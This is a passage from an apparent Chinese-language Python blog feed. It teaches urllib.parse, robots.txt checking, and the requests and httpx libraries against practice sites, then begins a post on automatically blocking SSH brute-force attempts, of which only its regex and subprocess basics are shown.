class="hljs-string">&#x27;index.html&#x27;</span>,<span class="hljs-string">&#x27;user&#x27;</span>,<span class="hljs-string">&#x27;id=0&#x27;</span>,<span class="hljs-string">&#x27;comment&#x27;</span>]<br>url = urlunparse(data)<br><span class="hljs-built_in">print</span>(url)<br><br>结果：<br>http://www.baidu.com/index.html;user?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span><span class="hljs-comment">#comment</span><br></code></pre></td></tr></table></figure><ul><li><strong>urlsplit:与urlparse类似，用于将url参数分割成不同的部分，但不会解析查询参数和片段部分</strong></li></ul><p>返回的是一个元组  可以用索引取值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlunparse,urlsplit<br>url = <span class="hljs-string">&#x27;http://www.baidu.com/index.html;user?id=0#comment&#x27;</span><br>parts = urlsplit(url)<br><span class="hljs-built_in">print</span>(parts)<br><span class="hljs-built_in">print</span>(parts.scheme)<br><span class="hljs-built_in">print</span>(parts[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(parts.netloc)<br><span class="hljs-built_in">print</span>(parts.path)<br><span class="hljs-comment"># print(parts.params)</span><br><span class="hljs-built_in">print</span>(parts.query)<br><span class="hljs-built_in">print</span>(parts.fragment)<br><br>结果：<br>SplitResult(scheme=<span class="hljs-string">&#x27;http&#x27;</span>, netloc=<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>, path=<span class="hljs-string">&#x27;/index.html;user&#x27;</span>, query=<span class="hljs-string">&#x27;id=0&#x27;</span>, fragment=<span class="hljs-string">&#x27;comment&#x27;</span>)<br>http<br>http<br>www.baidu.com<br>/index.html;user<br><span class="hljs-built_in">id</span>=<span class="hljs-number">0</span><br>comment<br><br><span class="hljs-comment">#urlunsplit  组合</span><br>data = (<span class="hljs-string">&#x27;http&#x27;</span>,<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>,<span class="hljs-string">&#x27;index.html&#x27;</span>,<span class="hljs-string">&#x27;id=0&#x27;</span>,<span class="hljs-string">&#x27;comment&#x27;</span>)<br><span class="hljs-built_in">print</span>(urlunsplit(data))<br>结果：<br>http://www.baidu.com/index.html?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span><span class="hljs-comment">#comment</span><br></code></pre></td></tr></table></figure><ul><li><strong>urljoin：urljoin()是连接一个基本URL和一个可能的相对URL来形成一个绝对URL</strong></li></ul><p>参数：</p><p>base  基本url，通常是一个绝对的url</p><p>url  这个是相对的url</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlunparse,urlsplit,urlunsplit,urljoin<br>base_url = <span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span><br>relative_url = <span class="hljs-string">&#x27;path/to/xxx&#x27;</span><br><br>url = urljoin(base=base_url,url=relative_url)<br><span class="hljs-built_in">print</span>(url)<br><br>结果：<br>https://www.baidu.com/path/to/xxx<br></code></pre></td></tr></table></figure><p>注意：base_url 提供了三项内容 scheme、netloc 和 path。如果这 3 项在新的链接里不存在，就予以补充；如果新的链接存在，就使用新的链接的部分。而 base_url 中的 params、query 和 fragment 是不起作用的。</p><ul><li><strong>parse_qs</strong></li></ul><p>get参数的序列化</p><ul><li><strong>parse_qsl</strong></li></ul><p>将参数转为元组组成列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlunparse,urlsplit,urlunsplit,urljoin,parse_qs <br>query = <span class="hljs-string">&#x27;name=handsomer1&amp;age=18&#x27;</span><br><span class="hljs-built_in">print</span>(parse_qs(query))<br><span class="hljs-built_in">print</span>(parse_qsl(query))<br><br>结果：<br>&#123;<span class="hljs-string">&#x27;name&#x27;</span>: [<span class="hljs-string">&#x27;handsomer1&#x27;</span>], <span class="hljs-string">&#x27;age&#x27;</span>: [<span class="hljs-string">&#x27;18&#x27;</span>]&#125;<br>[(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;handsomer1&#x27;</span>), (<span class="hljs-string">&#x27;age&#x27;</span>, <span class="hljs-string">&#x27;18&#x27;</span>)]<br></code></pre></td></tr></table></figure><ul><li><strong>quote</strong></li></ul><p>url编码</p><ul><li><strong>unquote</strong></li></ul><p>url解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote, unquote<br>keyword = <span class="hljs-string">&quot;卢本伟&quot;</span><br>url = <span class="hljs-string">&#x27;https://www.baidu.com/s?wd=&#x27;</span>+quote(keyword)<br><span class="hljs-built_in">print</span>(url)<br>url_1 = unquote(url)<br><span class="hljs-built_in">print</span>(url_1)<br><br>结果：<br>https://www.baidu.com/s?wd=%E5%8D%A2%E6%9C%AC%E4%BC%9F<br>https://www.baidu.com/s?wd=卢本伟<br></code></pre></td></tr></table></figure><ul><li><strong>robotparser模块</strong></li></ul><p>用于解析robots.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> urllib.robotparser <span class="hljs-keyword">import</span> RobotFileParser<br><br><span class="hljs-comment">#创建一个RobotFileParser对象用于解析robots.txt</span><br>robot_parser = RobotFileParser()<br><span class="hljs-comment">#robot_parser.set_url(&#x27;https://www.baidu.com/robots.txt&#x27;)</span><br>robot_parser.set_url(<span class="hljs-string">&#x27;https://www.zhihu.com/robots.txt&#x27;</span>)<br><span class="hljs-comment">#读取并解析robots.txt</span><br>robot_parser.read()<br><br><span class="hljs-comment">#检查是否可以爬取特定的url</span><br>user_agent = <span class="hljs-string">&quot;BaiduSpider&quot;</span><br><span class="hljs-comment">#check_url = &#x27;https://www.baidu.com/baidu&#x27;</span><br>check_url = <span class="hljs-string">&#x27;https://www.zhihu.com&#x27;</span><br><br><span class="hljs-comment">#can_fetch 确定指定的用户代理是否允许访问网页</span><br><span class="hljs-keyword">if</span> robot_parser.can_fetch(user_agent,check_url):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;可以爬取此url&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不能爬取此url&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h2><h3 id="普通请求-get-post-put-…"><a href="#普通请求-get-post-put-…" class="headerlink" title="普通请求 get post put …"></a>普通请求 get post put …</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#！/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment">#get</span><br><span class="hljs-comment"># r = requests.get(&#x27;http://httpbin.org/get&#x27;)</span><br><span class="hljs-comment"># print(r.text)</span><br><br><span class="hljs-comment">#添加参数的get请求</span><br><span class="hljs-comment"># data = &#123;</span><br><span class="hljs-comment">#     &#x27;name&#x27;:&#x27;handsomewuyue&#x27;,</span><br><span class="hljs-comment">#     &#x27;age&#x27;:&#x27;18&#x27;</span><br><span class="hljs-comment"># &#125;</span><br><span class="hljs-comment"># r = requests.get(&#x27;http://httpbin.org/get&#x27;,params=data)</span><br><span class="hljs-comment"># print(r.text)</span><br><br><span class="hljs-comment">#post</span><br><span class="hljs-comment"># data = &#123;</span><br><span class="hljs-comment">#      &#x27;name&#x27;:&#x27;handsomewuyue&#x27;,</span><br><span class="hljs-comment">#      &#x27;age&#x27;:&#x27;18&#x27;</span><br><span class="hljs-comment"># &#125;</span><br><span class="hljs-comment"># r = requests.post(&#x27;http://httpbin.org/post&#x27;,data=data)</span><br><span class="hljs-comment"># print(r.text)</span><br><br><span class="hljs-comment"># r = requests.put(&#x27;http://httpbin.org/put&#x27;)</span><br><span class="hljs-comment"># r = requests.delete(&#x27;http://httpbin.org/delete&#x27;)</span><br><span class="hljs-comment"># r = requests.head(&#x27;http://httpbin.org/head&#x27;)</span><br><span class="hljs-comment"># r = requests.options(&#x27;http://httpbin.org/options&#x27;)</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Usrt-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&#x27;</span><br>&#125;<br>r = requests.get(<span class="hljs-string">&#x27;https://www.zhihu.com&#x27;</span>,headers=headers)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h3 id="高级用法（文件上传-requestcookiejar-session等）"><a href="#高级用法（文件上传-requestcookiejar-session等）" class="headerlink" title="高级用法（文件上传 requestcookiejar session等）"></a>高级用法（文件上传 requestcookiejar session等）</h3><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span><br><span class="hljs-comment">#上传图片文件</span><br>file = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;favicon.ico&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)&#125;<br>r = requests.post(url,files=file)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h4 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#！/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://www.zhihu.com&#x27;</span><br><span class="hljs-comment"># r = requests.get(url=url)</span><br><span class="hljs-comment"># print(r.cookies)</span><br><span class="hljs-comment"># for k,v in r.cookies.items():</span><br><span class="hljs-comment">#     print(k + &quot;=&quot; + v)</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>:xxx<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">    &#x27;</span>User-Agent<span class="hljs-string">&#x27;:&#x27;</span>Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">116.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">r = requests.get(url=url,headers=headers)</span><br><span class="hljs-string">with open(&#x27;</span><span class="hljs-number">1.</span>html<span class="hljs-string">&#x27;,&#x27;</span>w<span class="hljs-string">b&#x27;) as f:</span><br><span class="hljs-string">    f.write(r.text.encode(&#x27;</span>utf-<span class="hljs-number">8</span><span class="hljs-string">&#x27;))</span><br><span class="hljs-string">    </span><br><span class="hljs-string">print(r.cookies)</span><br><span class="hljs-string">for k,v in r.cookies.items():</span><br><span class="hljs-string">    print(k + &quot;=&quot; + v)</span><br></code></pre></td></tr></table></figure><h4 id="使用cookiejar保存cookie，并携带cookie访问网页"><a href="#使用cookiejar保存cookie，并携带cookie访问网页" class="headerlink" title="使用cookiejar保存cookie，并携带cookie访问网页"></a>使用cookiejar保存cookie，并携带cookie访问网页</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#！/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests.cookies<br><br>Cookie = <span class="hljs-string">&#x27;xxx&#x27;</span><br><span class="hljs-comment">#创建一个空的RequestsCookieJar来保存cookie</span><br>jar = requests.cookies.RequestsCookieJar()<br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&#x27;</span><br>&#125;<br><br><span class="hljs-comment">#遍历分割cookies字符串，将每一个cookie的键值对添加到cookiejar中</span><br><span class="hljs-keyword">for</span> cookie <span class="hljs-keyword">in</span> Cookie.split(<span class="hljs-string">&#x27;;&#x27;</span>):<br>    key,value = cookie.split(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-number">1</span>)<br>    jar.<span class="hljs-built_in">set</span>(key,value)<br><br><span class="hljs-comment">#发送请求并且附带cookies和header</span><br>r = requests.get(<span class="hljs-string">&#x27;https://www.zhihu.com&#x27;</span>,cookies=jar,headers=headers)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.html&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(r.text.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><br>r1 = requests.get(<span class="hljs-string">&#x27;http://httpbin.org/cookies/set/number/123456&#x27;</span>)<br><span class="hljs-built_in">print</span>(r1.text)<br>r2 = requests.get(<span class="hljs-string">&#x27;http://httpbin.org/cookies&#x27;</span>)<br><span class="hljs-built_in">print</span>(r2.text)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230912153149172.png" alt="image-20230912153149172"></p><p>存在的问题：每次请求独立 第一次设置了cookie之后第二次请求不存在了</p><p>使用session：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#1.创建一个session</span><br>s = requests.Session()<br><br><span class="hljs-comment">#2.向网站发送get并且设置cookie</span><br>s.get(<span class="hljs-string">&#x27;http://httpbin.org/cookies/set/number/123456&#x27;</span>)<br><br><span class="hljs-comment">#3.再次发送请求 获取会话中的cookie</span><br>r = s.get(<span class="hljs-string">&#x27;http://httpbin.org/cookies&#x27;</span>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230912153518207.png" alt="image-20230912153518207"></p><h4 id="ssl证书校验"><a href="#ssl证书校验" class="headerlink" title="ssl证书校验"></a>ssl证书校验</h4><p>测试网址：<a href="https://ssr2.scrape.center/">https://ssr2.scrape.center/</a></p><img src="/img/image-20230912153814371.png" alt="image-20230912153814371" style="zoom:67%;" /><p>缺少证书，需要自己点继续前往的情况</p><p>直接请求 报错：</p><p><img src="/img/image-20230912154002903.png" alt="image-20230912154002903"></p><p>添加verify&#x3D;False即可绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">r = requests.get(<span class="hljs-string">&#x27;https://ssr2.scrape.center/&#x27;</span>,verify=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(r.status_code)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230912154243221.png" alt="image-20230912154243221"></p><h4 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h4><p>timeout参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">r = requests.get(<span class="hljs-string">&#x27;https://ssr2.scrape.center/&#x27;</span>,verify=<span class="hljs-literal">False</span>,timeout=<span class="hljs-number">0.1</span>)<br><span class="hljs-built_in">print</span>(r.status_code)<br></code></pre></td></tr></table></figure><h4 id="身份认证（httpbasicAuth）"><a href="#身份认证（httpbasicAuth）" class="headerlink" title="身份认证（httpbasicAuth）"></a>身份认证（httpbasicAuth）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> requests.auth <span class="hljs-keyword">import</span> HTTPBasicAuth<br><span class="hljs-comment">#使用HTTPBasicAuth添加用户密码</span><br>r = requests.get(<span class="hljs-string">&#x27;https://ssr3.scrape.center/&#x27;</span>,verify=<span class="hljs-literal">False</span>,auth=HTTPBasicAuth(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>))<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h4 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> weakref <span class="hljs-keyword">import</span> proxy<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">#http代理</span><br>proxy_list = &#123;<br>    <span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;http://代理地址:端口&#x27;</span>,<br>    <span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;http://代理地址:端口&#x27;</span><br>&#125;<br><br>requests.get(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>,proxies=proxy_list)<br><br><span class="hljs-comment">#socks代理</span><br>proxies = &#123;<br>    <span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;sock5:username:password@host:port&#x27;</span><br>&#125;<br>requests.get(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>,proxies=proxies)<br></code></pre></td></tr></table></figure><h2 id="httpx"><a href="#httpx" class="headerlink" title="httpx"></a>httpx</h2><p>httpx库  爬取使用http2.0的网站</p><p><a href="https://spa16.scrape.center/">https://spa16.scrape.center/</a></p><p><img src="/img/image-20230929170208257.png" alt="image-20230929170208257"></p><p>支持http2.0还需要安装2.0的支持：</p><p>pip install “httpx[http2]”</p><p>代码中配置：</p><p>client &#x3D; httpx.Client(http2&#x3D;True)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> httpx<br><br>url = <span class="hljs-string">&#x27;https://spa16.scrape.center/&#x27;</span><span class="hljs-comment">#使用http2</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;</span><br>&#125;<br>data = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;handsome r1&quot;</span><br>&#125;<br>client = httpx.Client(http2=<span class="hljs-literal">True</span>)<br><span class="hljs-comment">#response = client.get(url,headers=headers)</span><br><span class="hljs-comment">#post请求</span><br>response = client.post(<span class="hljs-string">&#x27;https://www.httpbin.org/post&#x27;</span>,headers=headers,data=data)<br><br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ssh暴力破解阻断</title>
    <link href="/2023/09/29/ssh%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E9%98%BB%E6%96%AD/"/>
    <url>/2023/09/29/ssh%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E9%98%BB%E6%96%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="暴力破解的自动阻断"><a href="#暴力破解的自动阻断" class="headerlink" title="暴力破解的自动阻断"></a>暴力破解的自动阻断</h1><p>项目背景：</p><p>只要是暴漏在公网云服务器，每天都会有大量的暴力破解行为</p><p>解决方法：</p><p>1.更换端口（无济于事）<br>2.买云防护，waf （贵）</p><p>爆破破解的一个自动阻断</p><h2 id="re正则表达式"><a href="#re正则表达式" class="headerlink" title="re正则表达式"></a>re正则表达式</h2><h3 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h3><p><strong>findall</strong>  找到匹配到的所有子串，并返回一个列表，如果没有匹配到就返回空</p><p><img src="/img/image-20230905100541279.png" alt="image-20230905100541279"></p><p><strong>search</strong>函数 扫描整个字符串，并且返回第一个，如果没匹配到就返回空</p><p><img src="/img/image-20230905100937856.png" alt="image-20230905100937856"></p><p><strong>匹配元字符</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\d</span>               匹配所有数字<span class="hljs-number">0</span>-<span class="hljs-number">9</span><br><span class="hljs-string">\D</span>               匹配非数字<br><span class="hljs-string">\w</span>               匹配所有单词字符，包括大小写字母 数字 下划线 中文<br><span class="hljs-string">\W</span>               匹配剩下的，空格 换行符 特殊字符<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905101528009.png" alt="image-20230905101528009"></p><p><strong>匹配字符集</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">字符的集合，用<span class="hljs-comment">[]</span>表示，字符集内用“^”表示“非”<br>\d=<span class="hljs-comment">[0-9]</span><br>\D=<span class="hljs-comment">[ ^ 0-9]</span><br>\w!=<span class="hljs-comment">[a-zA-Z_0-9]</span>??? 还有中文<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905102515659.png" alt="image-20230905102515659"></p><p><strong>匹配空白字符</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">空白符包含：<br><span class="hljs-string">&#x27; &#x27;</span>空格    <span class="hljs-string">\n换行符</span>   <span class="hljs-string">\t制表符</span>   <span class="hljs-string">\r回车符</span><br>使用<span class="hljs-string">\s来匹配他们</span><br>[^<span class="hljs-string">\s]</span> = <span class="hljs-string">\S</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905102757945.png" alt="image-20230905102757945"></p><p>**{} **表示匹配标定字符数量</p><p><img src="/img/image-20230905103436862.png" alt="image-20230905103436862"></p><p><strong>特殊数量符号</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">特殊数量符号：<br><span class="hljs-bullet">*              </span>匹配前一个字符0or无限次<br>+              匹配前一个字符1or无限次<br><span class="hljs-bullet">.              </span>匹配除换行符\n意外的任意1个字符<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905104011139.png" alt="image-20230905104011139"></p><p><strong>字符组</strong><br>把字符用()括起来，叫字符组，目的就为将匹配成的字符串分组</p><p><img src="/img/image-20230905104828290.png" alt="image-20230905104828290"></p><p><strong>匹配参数模式</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">findall方法其实他有第三个参数，他是默认参数，参数模式。<br>re.I         忽略大小写<br>re.S         匹配空白符<br>多个参数用   “<span class="hljs-string">|”</span><br></code></pre></td></tr></table></figure><img src="/img/image-20230905105310566.png" alt="image-20230905105310566" style="zoom:80%;" /><h2 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h2><p><strong>项目需求：执行命令并将输出劫持实现日志的监控</strong></p><p>用于启动新的进程的模块，它可以用于执行外部命令，获取进程的输出，向进程发送输入和等待进程结束。</p><p>多进程协同，python里大概有这么三种方式<br>1.os.system函数<br>阻塞式<br>2.multiprocessing 模块<br>使用场景，密集型的计算</p><p>3.subprocess模块</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">subprocess.run </span>  执行指定的命令，等待命令执行完成后返回一个对象<br><span class="hljs-keyword">subprocess.call</span>执行指定的命令，返回命令执行的状态 （成功为<span class="hljs-number">0</span>  失败为非<span class="hljs-number">0</span>）<br><span class="hljs-keyword">subprocess.check_all</span>与上面类似，区别是会输出报错<br><span 